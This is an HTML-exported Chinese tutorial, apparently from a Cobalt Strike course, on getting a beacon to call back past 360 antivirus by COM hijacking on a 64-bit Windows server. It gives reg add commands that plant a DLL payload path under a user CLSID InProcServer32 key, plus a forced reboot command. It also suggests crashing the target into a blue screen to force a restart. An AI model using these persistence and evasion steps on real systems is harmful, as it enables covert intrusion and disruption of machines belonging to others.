<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cobalt-strike-beacon-免杀上线--com-劫持-"><span class="csDE05BCC">Cobalt Strike beacon </span><span class="csECDA2D3">免杀上线</span><span class="csDE05BCC"> [ com </span><span class="csECDA2D3">劫持</span><span class="csDE05BCC"> ]</span></a></h1>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">模拟目标环境</span><span class="cs8926E06">:</span></p><p class="cs6FD73CFB"><span class="cs8926E06">AV-Server 192.168.3.58 </span><span class="cs9C1B1871">装有最新版</span><span class="cs8926E06"> 360 </span><span class="cs9C1B1871">套装</span><span class="cs8926E06"> [ </span><span class="cs9C1B1871">卫士</span><span class="cs8926E06"> + </span><span class="cs9C1B1871">杀毒</span><span class="cs8926E06"> ] 2008r2 64 </span><span class="cs9C1B1871">位系统</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">第一步</span><span class="cs8926E06">,</span><span class="cs9C1B1871">既然是劫持</span><span class="cs8926E06"> com,</span><span class="cs9C1B1871">首先肯定得先有个</span><span class="cs8926E06"> dll </span><span class="cs9C1B1871">才行</span><span class="cs8926E06">,</span><span class="cs9C1B1871">因为目标是</span><span class="cs8926E06"> 64 </span><span class="cs9C1B1871">位系统</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们此处在创建好监听器以后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">直接生成一个</span><span class="cs8926E06"> 64 </span><span class="cs9C1B1871">位的</span><span class="cs8926E06"> dll payload </span><span class="cs9C1B1871">即可</span><span class="cs8926E06">,</span><span class="cs9C1B1871">具体如下</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/Cobalt%20Strike%20beacon%20%e5%85%8d%e6%9d%80%e4%b8%8a%e7%ba%bf%20[%20com%20%e5%8a%ab%e6%8c%81%20_files/image0.png" width="560" height="146" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">第二步</span><span class="cs8926E06">,</span><span class="cs9C1B1871">将</span><span class="cs8926E06"> dll payload </span><span class="cs9C1B1871">丢到目标机器的任意隐蔽</span><span class="cs8926E06">[</span><span class="cs9C1B1871">务必要尽可能隐蔽</span><span class="cs8926E06">]</span><span class="cs9C1B1871">目录下</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并创建相应劫持项</span><span class="cs8926E06">,</span><span class="cs9C1B1871">指明</span><span class="cs8926E06"> dll payload </span><span class="cs9C1B1871">绝对路径</span></p><p class="cs3A447A38"><span class="cs9FB05234"># reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InProcServer32 /v &quot;&quot; /t REG_SZ /d &quot;C:\Windows\Temp\info.dll&quot; /f</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InProcServer32 /v &quot;ThreadingModel&quot; /t REG_SZ /d &quot;Apartment&quot; /f</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># shutdown /r /t 0</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/Cobalt%20Strike%20beacon%20%e5%85%8d%e6%9d%80%e4%b8%8a%e7%ba%bf%20[%20com%20%e5%8a%ab%e6%8c%81%20_files/image1.png" width="560" height="112" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">第三步</span><span class="cs8926E06">, </span><span class="cs9C1B1871">等待目标重启系统加载劫持项时便会触发执行我们的</span><span class="cs8926E06"> dll payload,</span><span class="cs9C1B1871">随后便会看到</span><span class="cs8926E06"> beacon shell </span><span class="cs9C1B1871">被弹会</span><span class="cs8926E06">,</span><span class="cs9C1B1871">至于实战中如何尽可能快的让目标管理员去重启系统</span><span class="cs8926E06">,</span><span class="cs9C1B1871">比如</span><span class="cs8926E06">,</span><span class="cs9C1B1871">你可以可以试着想办法把它系统搞蓝屏</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/Cobalt%20Strike%20beacon%20%e5%85%8d%e6%9d%80%e4%b8%8a%e7%ba%bf%20[%20com%20%e5%8a%ab%e6%8c%81%20_files/image2.png" width="560" height="230" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">如下很明显</span><span class="cs8926E06">,</span><span class="cs9C1B1871">此时的</span><span class="cs8926E06"> 360 </span><span class="cs9C1B1871">仍无任何反应</span><span class="cs8926E06">,</span><span class="cs9C1B1871">因为</span><span class="cs8926E06"> CobaltStrike 3.8 </span><span class="cs9C1B1871">生成的</span><span class="cs8926E06"> dll payload,</span><span class="cs9C1B1871">默认就是直接免杀</span><span class="cs8926E06"> 360 </span><span class="cs9C1B1871">的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">至于</span><span class="cs8926E06"> 3.8 </span><span class="cs9C1B1871">之后的版本就更不用说了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">免杀效果肯定只会更好</span><span class="cs8926E06">,</span><span class="cs9C1B1871">此处由于各种各样的原因</span><span class="cs8926E06">,</span><span class="cs9C1B1871">兵没有拿最新版的</span><span class="cs8926E06">CobaltStrike 3.13 </span><span class="cs9C1B1871">给大家做演示</span><span class="cs8926E06">,</span><span class="cs9C1B1871">其实</span><span class="cs8926E06">,</span><span class="cs9C1B1871">说白点</span><span class="cs8926E06">,</span><span class="cs9C1B1871">仅仅作为一个使用者来讲</span><span class="cs8926E06">,</span><span class="cs9C1B1871">它们在实际使用上的差别并不是特别大</span><span class="cs8926E06">,</span><span class="cs9C1B1871">新版本中无非就是新增了一些功能和特性</span><span class="cs8926E06">,</span><span class="cs9C1B1871">功能使用非常简单那</span><span class="cs8926E06">,</span><span class="cs9C1B1871">特性又都是体现在内部的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">外表也看不太出来</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以在学习期间</span><span class="cs8926E06">,</span><span class="cs9C1B1871">大可不必过于纠结现在用的是什么版本</span><span class="cs8926E06">,</span><span class="cs9C1B1871">先起码能保证自己灵活用起来再说</span><span class="cs8926E06">,</span><span class="cs9C1B1871">以后再去考虑更多别的事情</span><span class="cs8926E06">,</span><span class="cs9C1B1871">也为时不晚</span></p><p class="cs40DD2BC9"><span class="cs8926E06">&nbsp;</span></p></body>
</html>
